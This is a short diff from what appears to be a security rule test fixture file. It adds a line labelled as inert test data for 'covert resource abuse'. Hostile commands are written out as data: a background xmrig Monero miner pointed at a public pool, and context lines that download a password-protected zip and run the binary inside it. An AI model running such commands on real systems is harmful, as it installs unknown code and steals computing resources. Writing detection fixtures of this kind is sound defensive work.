@@ -65,3 +65,6 @@ python3 -c "import yaml; yaml.unsafe_load(open('/tmp/agent-state.yml'))"
 curl -sSL "$RELEASE_BASE/helper.zip" -o helper.zip
 unzip -P "infected123" helper.zip
 chmod +x helper && ./helper --install
+
+# SG-EXE-008 fixture: covert resource abuse. Inert test data — never executed.
+nohup ./xmrig --url stratum+tcp://pool.minexmr.com:4444 --user 44AFFq5kSiGBoZ --coin monero --background &
